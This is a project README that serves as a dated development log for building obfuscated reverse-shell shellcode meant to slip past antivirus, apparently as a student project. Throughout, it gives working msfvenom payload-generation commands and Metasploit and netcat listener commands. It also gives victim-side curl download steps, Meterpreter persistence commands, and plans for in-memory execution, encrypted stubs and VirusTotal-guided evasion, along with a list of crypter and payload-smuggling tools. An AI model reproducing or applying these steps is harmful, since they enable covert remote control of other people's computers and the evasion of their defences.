# reverse-shell
Obfuscated reverse-shell shellcode aimed to bypass signature-based antivirus algorithms.
# 12/4/2024
 Russell:<br>
 Check out the demo here: https://youtu.be/QOpDjsafkcI    <br>
 If I had more time on this project this is what I would do:<br>
     - Use custom payload (44kb compressed to less?)<br>
     - store downloaded payload directly into executable memory (no need to copy it twice)<br>
     - Use Diffie-Hellman technique to encrypt/decrypt the key to our ceasar cipher encryption/decryption method.<br>
     - make the stub decrypt, re-allocate, and execute the payload block-by-block (or byte-by-byte if possible) instead of executing the entire decrypted payload at once. This way, we could execute portions of the code before executing pointless code before executing more of the payload, repetitively.
     <br>- Use homomorphic encryption methods instead?
     <br>- Look into tokenization/data masking methods?
# 12/1/2024
Russell:<br>
Uploaded folders:<br> download, encapsulate, and obfuscate.<br>These are my final revisions for this encapslated+obfuscated reverse-shell project. The other team members will be uploading their obfuscation contributions to this repository before midnight.

# 11/30/2024
Russell:<br>
    Here is a flowchart of the reverse shell process. We still need to do more research on obfuscation methods because this output is easily detected by AV.
    <br><br>![fc](flow-ss2.png)

# 11/29/2024
Russell:<br>
    uploaded folder 11-29 <br>
    - this folder contains crypter.c which encrypts calc.exe shellcode <br>
    - this folder contains buff-stub.c which decrypts and copies byte-by-byte before executing the shellcode <br>

# 11/28/2024
Russell:<br>
Some obfuscation methods to research:<br>
www.youtube.com/watch?v=xNhQMwC0BLo&ab_channel=NullByte
https://github.com/Ekultek/Graffiti

https://github.com/mhaskar/DNSStager

https://github.com/Tsuyoken/ImgBackdoor

https://github.com/NUL0x4C/GP

https://github.com/De3vil/HtmlSmuggling

https://github.com/HugoJH/HideIntoPNG

https://github.com/dogematti/Steganography-hidden-payload

https://github.com/machine1337/Fuddropper

https://github.com/powerboat9/payload

https://github.com/Romiiis/Digital-steganography

https://github.com/david-crow/white-text

https://github.com/Michesels/Pure-Crypter-ADVANCED-INJECTION-TECHNOLOGY-64BIT-32BIT-Anti-Delete

# 11/18/2024
![SS](Screenshot-2024-11-05-110237.png)

TODO: research polymorphic encryption. Note: polyalphabetic cipher and polymorphic encryption are NOT the same.

# 10/31/2024
Russell:<br> We should look into the virustotal alerts so we can better understand why and what is being detected within the stub. (~~)<br><br>One idea to better the virustotal score is to have the user download a program called "decrypt-stub.ps1." Once the .ps1 file is made then we can encrypt it to base64 (using https://gchq.github.io/CyberChef/) and then convert that to a .exe by using the software called "Win-PS2EXE". Then, the new .exe should be tested on virustotal.~~

~~Once the .ps1 is converted to .exe, this program would then download the encrypted stub, decrypt it, and then execute it. The stub would then download the encrypted shellcode, decrypt it, then execute the reverse shell payload.~~

Update: It was an idea. but looking back- I think there are better ways to go about this. Check out https://www.youtube.com/watch?v=vq6wNGYzdDE&ab_channel=JohnHammond

# 10/30/2024
Russell:<br>Huzzzaaaaahhhh! I have finally got the stub to execute! It turns out a few of the shellcode bytes had been deformed from converting from hex string to hex bytes. I manually compared each byte from the debugger
and figured this issue out: ![two-fingers](10-30-ss.png). 
<br>I call this the two-finger brute-force method. It wasnt skipping ' ' or semicolons. Even after fixing this, the executable would not function. But when I moved this executable to another folder it worked. This is very strange because I excluded microsoft defender 
from checking both folders out. And when I removed both exclusions from windows security- no difference was made. The trojan can be executed from one directory but not another. Why? Executing the stub but with obfuscated calc.exe code works fine in all directories. So, there must be some kind of firewall detecting the malicous code? But not in some folders? I need to investigate this further. Anyways, I got it working. See main-stub-10-30.cpp.<br>
![working](huzzaaah.png)

And check out the virus total results (windows does not detect it):
![VT](virustotal-10-30.png)

The encrypted shellcode file that the stub downloads goes completely undetected:
![VT1](encrypted-raw-ss.png)

Feelsgoodman. So, whats next? Well, removing any variables or strings containing wording that may appear to relate to malicious activity. For example, I can open the .exe in notepad and see several instances of the word "shellcode."
Surely by doing this we can lower the detections on virustotal, right?

# 10/29/2024
Russell:<br>Well, after 8 hours of staring at my screen lets see what progress I have made.<br><br>
    So, activeXSploit.cpp actually executes inline malicous shellcode. Cool, but it still touches the disk. I was able to
    get the shellcode from winsock-tcp-8448.exe using:
    
    msfvenom -p windows/exec CMD=winsock-tcp-8448.exe -a x86 --platform windows -e x86/shikata_ga_nai -f c -o shellcode.c

But I spent most of the time on trying to get windows to execute shellcode from virtually allocated memory. I have tested it down to the bone. Look here:
![payload-progress](payload-progress.png)

This is a picture of the printed output from main-stub-10-29.c
You can see the machine code is exactly what it should be. Yet, it is not being executed. Must we use the execute functions from activeXSploit.cpp? I will try this next.
Is it because i used -a x86 instead of x64 within mfvenom command to create shellcode.c? 

# 10/21/2024
Russell:<br> Not much progress made. I need to dive into the debugged program and find out whats going on with the machine code. It executes great when its on the disk but not when it is downloaded. The machine code is 100% the same.

# 10/19/2024

Russell:<br>
    Uploaded 10-19-obfuscate. This folder contains a python script which encrypts a binary file and then a stub which decrypts a binary file and then executes it. This shellcode DOES touch the disk, however; it is the first working<br> 
    reverse shell executable that has gone through our unique encrypt/decrypt process.Virus Total scored it 11/73 security vendors detecting this malware. Not to mention Microsoft does not detect this as malware. <br>This is a great milestone for what we are trying to accomplish and expose. What is needed next: modify the stub to retrieve the raw shellcode from a web server and then download it to dynamically 
    allocated memory. This way no obscure shellcode ever touches the disk. Then, we test on virus total and go from there.

# 10/18/2024
Russell:<br>
    uploaded main-stub.c
    This "stub" successfully executes our malicous shellcode!!! Feelsgoodman.

To create payload:

        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o file.exe
        

I converted a working reverse shell exe to a raw binary file:

        msfvenom -p windows/exec CMD=file.exe -f raw -o file.raw

To listen:

        msfconsole -q -x "use multi/handler; set payload windows/x64/shell/reverse_tcp; set lhost {IP}; set lport {port}; exploit"

Then, I put the binary file into a hex editor and then converted that hex machine code to a .c file
to be stored as an unsigned character array containing our malicous hex machine code.
Then, I put the hex machine code inside of main-stub.c
compiled and then muah, perfection. Works great. So now what is next to do is to make a python script to encrypt the shellcode and then modify the main-stub.c to decrypt the shellcode and then execute. Oh, and of course the encrypted shellcode should be uploaded to a cloud so it never touches the user's disk.


# 10/17/2024
Russell:<br>

Uploaded winsock-tcp-8448.cpp and winsock-tcp-8448.exe

These are working reverse shells, but they are easily detected as malware. Obfuscation needed. 
        -to listen for winsock reverse shell as attacker: 
            
            $nc -nvlp 8448

We could obfuscate using caesar cipher. It would go undectected by windows security; however, not completely undetected
    on virustotal. 
    (see https://www.youtube.com/watch?v=hjNLylCAmBo&list=PLT3EmOikjcyY2t6zVJT7rSB1sqK2IMq4e&index=2&ab_channel=RedSiege)

"Jigsaw" and "Jargon" encryption techniques seem to be effective at avoiding detection. 

  Basically where we are at right now is we have functional reverse shell executables and a shellcode version of it. We need to create a python program
to encrypt the shellcode. then, we need to make a c program that takes the shellcode as input, decrypts, and executes it- all without detection by antivirus.
Check out the PDF file i uploaded: "Generating-Antivirus-Evasive-Executables-Using-Code-Mutation.pdf"
It is a short and sweet explanation of what we are trying to accomplish.


This is a good video explanation of getting the shellcode to run: (https://www.youtube.com/watch?v=2tmUksnQiNA&ab_channel=CosmodiumCyberSecurity)
    

# 10/16/2024
Russell:<br>

  uploaded payload-revshell-8448.exe
  
  uploaded shellcode-tcp-8448-c

      payload-revshell-8448.exe is a WORKING windows executable which connects to the attacker listening! It was compiled using msfvenom.
    the only down side is that it is easily detectable by antivirus (that is a good thing ethically- obviously)

      Now, we could call it a day and just convert the exe to a .jpg or .pdf (see https://www.youtube.com/watch?v=cXEkSQl9wmw&ab_channel=ebolaman)
      BUT our purposal that we execute obfuscated shellcode.
    
      We want to expose a day0 trojan.... so we still need to obfuscate the shellcode version of this exe that was compiled by msfvenom
    (see shellcode-tcp-8448-c.txt)

    This executable works so then we should be able to execute this shellcode.
  
  Steps needed in the main c program:
  
      - Download shellcode payload (HTTP GET REQUEST) OR use shellcode-tcp-8448-c.txt file in repo
      
      - parse shellcode properly:
          - there should be no Null bytes (0x00), Line feeds (0x0A), carriage returns (0x0D), or Form feeds (0x0C)
          - only the shellcode instructions stored into char* memBuffer. 
          - then, loop through memBuffer[] and save contents as hexidecimal machine code to the dynamically 
              allocated unsigned char shellcode[]
              
      - execute machine code within shellcode[]

  Uploaded main.cpp

  Right now, the main.cpp downloads the shellcode, converts it to dynamic allocated memory that is reconizable to the system as hexidecimal instructions , and prints the the converted shellcode.
    
  Here is the shellcode before conversion:
  
  ![Before](payload-before-conversion.png)

  Here is the shellcode after conversion:
  
  ![After](payload-after-conversion-raw.png)


  We still need to figure out how to execute this shellcode so that it connects the user to the attacker.


  # 10/15/2024
  To-do: create a c program to download the shellcode and execute it. 
  
Russell:<br>
          Check out this code generated by chatGPT (OUTDATED LINK)    https://chatgpt.com/share/670ecd31-e6f4-8007-975a-aa463a4bbc49
           It lays the foundation for what we are attempting to do. It has not been tested thoroughly but is a good reference
           to the steps required for the program executable.



# 10/14/2024:
    
Russell:<br>
      - created GitHub repo and uploaded the research paper as well as our proposal.
      - created and uploaded payload-22.c

  To create a payload:
            
      $msfvenom -p windows/meterpreter/reverse_tcp lhost={IP of attacker} lport={port #} --format c -o payload-22.c -b "\x00\x0A\x0\x0C\x0D"

  An alternative would be to check out www.exploit-db.com/shellcodes/ for people who create their own shellcode generators. 
      These can be less detectable.
  Here's one i found:
  https://github.com/senzee1984/micr0_shell
      
  To download the shellcode as a victim via web server:
    
      $curl {your http web server}/download.php > payload-22.txt
      
  Attacker must have Metasploit installed in order to listen for the victim's connection on a port.  
      To download the metasploit installer:
      
      $curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
      $chmod 755 msfinstall
      $./msfinstall
      $sudo msfconsole
      

  To run a listener on attackers machine:
      
    msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {IP}; set lport {PORT}; exploit"
      

  Once the victim has executed the reverse shell, the attacker will see "Meterpreter session 1 opened." Lastly, the
      attacker enters the following command to ensure persistence and enter the shell of the victim:

      $run persistence -p {attacker port} -r {attacker IP}
      $shell



  For a broad video explanation watch the following youtube video:
      https://www.youtube.com/watch?v=17JontiMrWQ


      

  

    
